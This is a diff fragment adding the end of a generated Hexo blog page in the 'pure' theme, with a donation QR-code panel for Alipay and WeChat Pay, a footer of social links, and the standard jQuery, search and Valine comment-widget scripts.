+              <div class="donate-payimg">
+                <img src="/images/donate/2.png" alt="扫码支持" title="扫一扫" />
+              </div>
+              <p class="text-muted mv">扫码打赏，你说多少就多少</p>
+              <p class="text-grey">打开支付宝扫一扫，即可进行扫码打赏哦</p>
+            </div>
+            <div role="tabpanel" class="tab-pane fade" id="wechatpay">
+              <div class="donate-payimg">
+                <img src="/images/donate/1.png" alt="扫码支持" title="扫一扫" />
+              </div>
+              <p class="text-muted mv">扫码打赏，你说多少就多少</p>
+              <p class="text-grey">打开微信扫一扫，即可进行扫码打赏哦</p>
+            </div>
+          </div>
+          <div class="donate-footer">
+            <ul class="nav nav-tabs nav-justified" role="tablist">
+              <li role="presentation" class="active">
+                <a href="#alipay" id="alipay-tab" role="tab" data-toggle="tab" aria-controls="alipay" aria-expanded="true"><i class="icon icon-alipay"></i> 支付宝</a>
+              </li>
+              <li role="presentation" class="">
+                <a href="#wechatpay" role="tab" id="wechatpay-tab" data-toggle="tab" aria-controls="wechatpay" aria-expanded="false"><i class="icon icon-wepay"></i> 微信支付</a>
+              </li>
+            </ul>
+          </div>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+
+
+
+</main>
+
+  <footer class="footer" itemscope itemtype="http://schema.org/WPFooter">
+	
+	
+    <ul class="social-links">
+    	
+        <li><a href="/GXA111666" target="_blank" title="VX" data-toggle=tooltip data-placement=top><i class="icon icon-VX"></i></a></li>
+        
+        <li><a href="/1252195810" target="_blank" title="QQ" data-toggle=tooltip data-placement=top><i class="icon icon-QQ"></i></a></li>
+        
+        <li><a href="/1252195810@qq.com" target="_blank" title="E-Mail" data-toggle=tooltip data-placement=top><i class="icon icon-E-mail"></i></a></li>
+        
+        <li><a href="/atom.xml" target="_blank" title="Rss" data-toggle=tooltip data-placement=top><i class="icon icon-rss"></i></a></li>
+        
+    </ul>
+
+    <div class="copyright">
+    	
+        <div class="publishby">
+        	Theme by <a href="https://github.com/cofess" target="_blank"> cofess </a>base on <a href="https://github.com/cofess/hexo-theme-pure" target="_blank">pure</a>.
+        </div>
+    </div>
+</footer>
+  <script src="//cdn.jsdelivr.net/npm/jquery@1.12.4/dist/jquery.min.js"></script>
+<script>
+window.jQuery || document.write('<script src="js/jquery.min.js"><\/script>')
+</script>
+
+<script src="/js/plugin.min.js"></script>
+
+
+<script src="/js/application.js"></script>
+
+
+    <script>
+(function (window) {
+    var INSIGHT_CONFIG = {
+        TRANSLATION: {
+            POSTS: '文章',
+            PAGES: '页面',
+            CATEGORIES: '分类',
+            TAGS: '标签',
+            UNTITLED: '(未命名)',
+        },
+        ROOT_URL: '/',
+        CONTENT_URL: '/content.json',
+    };
+    window.INSIGHT_CONFIG = INSIGHT_CONFIG;
+})(window);
+</script>
+
+<script src="/js/insight.js"></script>
+
+
+
+
+
+
+   
+
+
+
+
+   
+    
+  <script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
+  <script src="//cdn.jsdelivr.net/npm/valine"></script>
+  <script type="text/javascript">
+  var GUEST = ['nick', 'mail', 'link'];
+  var meta = 'nick,mail,link';
+  meta = meta.split(',').filter(function(item) {
+    return GUEST.indexOf(item) > -1;
+  });
+  new Valine({
+    el: '#vcomments',
+    verify: false,
+    notify: false,
+    appId: '',
+    appKey: '',
+    placeholder: 'Just go go',
+    avatar: 'mm',
+    meta: meta,
+    pageSize: '10' || 10,
+    visitor: false
+  });
+  </script>
+
+     
+
+
+
+
+
+
+
+</body>
+</html>
